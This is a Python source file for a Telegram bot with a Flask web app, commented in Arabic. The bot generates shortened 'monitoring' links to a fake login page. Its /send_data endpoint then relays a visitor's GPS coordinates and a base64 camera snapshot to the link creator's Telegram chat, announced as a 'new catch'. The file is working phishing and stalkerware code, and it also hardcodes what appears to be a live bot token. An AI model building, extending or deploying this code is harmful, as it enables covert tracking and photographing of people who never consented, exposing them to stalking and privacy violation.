import telebot
import requests
import base64
from flask import Flask, request, render_template

# --- الإعدادات الأساسية ---
TOKEN = '8313488232:AAFSCmIgCV-ped9mxJFGs3RyRn-A0vw8_Tg' #
CHANNEL_ID = ''  # اتركها فارغة حالياً لتجنب مشاكل فحص الاشتراك
BASE_URL = 'https://droidlink.vercel.app' #

bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

def shorten(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}")
        return res.text if res.status_code == 200 else url
    except:
        return url

# --- معالج الرسائل (Start) ---
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🇸🇦 Arabic", callback_data=f"lang_ar_{user_id}"))
    markup.add(telebot.types.InlineKeyboardButton("🇺🇸 English", callback_data=f"lang_en_{user_id}"))
    
    bot.send_message(message.chat.id, "🌐 اختر لغتك / Choose Language:", reply_markup=markup)

# --- معالج الأزرار ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.data.split('_')[-1]
    
    if "lang_" in call.data:
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("➕ إنشاء رابط مراقبة", callback_data=f"gen_{user_id}"))
        bot.edit_message_text("✅ النظام جاهز. اضغط لإنشاء الرابط:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif "gen_" in call.data:
        short_link = shorten(f"{BASE_URL}/login?id={user_id}")
        bot.send_message(call.message.chat.id, f"✅ تم تجهيز رابطك:\n\n{short_link}")

# --- مسارات الويب (Vercel) ---
@app.route('/login')
def login():
    return render_template('index.html')

@app.route('/send_data', methods=['POST'])
def send_data():
    data = request.json
    owner_id = data.get('owner_id')
    
    # إرسال الموقع
    loc_msg = f"📍 صيد جديد!\nالموقع: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
    bot.send_message(owner_id, loc_msg)
    
    # إرسال الصورة إذا وجدت
    if 'img' in data:
        img_data = base64.b64decode(data['img'].split(',')[1])
        bot.send_photo(owner_id, img_data, caption="📸 لقطة الكاميرا")
        
    return "ok", 200

@app.route('/', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return "!", 200
    else:
        return "Error", 403

# ربط المسار الرئيسي بالويب هوك لضمان عمل Vercel بشكل صحيح
app.add_url_rule('/', endpoint='webhook', view_func=webhook, methods=['POST'])
